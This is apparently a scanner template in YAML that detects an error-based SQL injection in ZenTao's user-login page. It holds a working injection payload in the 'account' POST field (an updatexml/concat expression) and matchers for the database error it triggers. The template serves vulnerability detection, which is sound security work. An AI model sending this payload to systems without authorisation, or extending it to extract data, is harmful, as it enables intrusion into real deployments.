id: poc-yaml-zentao-router-class-php-sql-injection
info:
  name: ZenTao OA User Router Class SQL Injection
  author: ProjectDiscoveryAI
  severity: high
  tags: sql-injection

variables:
  v1: "{{rand_text_alphanumeric(8)}}"
  v2: "{{substr(md5(v1),0,20)}}"

http:
  - method: POST
    path:
      - "{{BaseURL}}/zentao/user-login.html"
    headers:
      Content-Type: application/x-www-form-urlencoded
      Referer: "{{BaseURL}}/zentao/user-login.html"
    body: "account=admin'+and+updatexml(1,concat(0x1,md5('{{v1}}')),1)+and+'1'='1"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "{{v2}}"
      - type: word
        part: body
        words:
          - "Uncaught PDOException: SQLSTATE[HY000]"
